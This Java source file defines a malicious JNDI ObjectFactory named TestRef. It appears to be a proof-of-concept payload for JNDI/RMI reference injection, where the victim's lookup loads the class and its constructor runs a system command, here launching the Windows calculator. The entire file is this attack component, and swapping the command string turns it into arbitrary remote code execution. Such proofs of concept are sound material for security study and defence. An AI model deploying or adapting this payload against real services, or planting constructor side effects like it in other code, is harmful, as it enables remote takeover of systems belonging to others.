import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.rmi.RemoteException;
import java.util.Hashtable;

/**
 * @author hasee
 * @version 1.0
 * @description: TODO
 * @date 2023/5/12 20:14
 */
public class TestRef implements ObjectFactory {
    public TestRef() throws IOException {
        Runtime.getRuntime().exec("calc");
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        System.out.println("Object is " + obj);
        System.out.println("name is " + name);
        System.out.println("nameCtx is " + nameCtx);
        System.out.println("environment is " + environment);
        return this;
    }
}
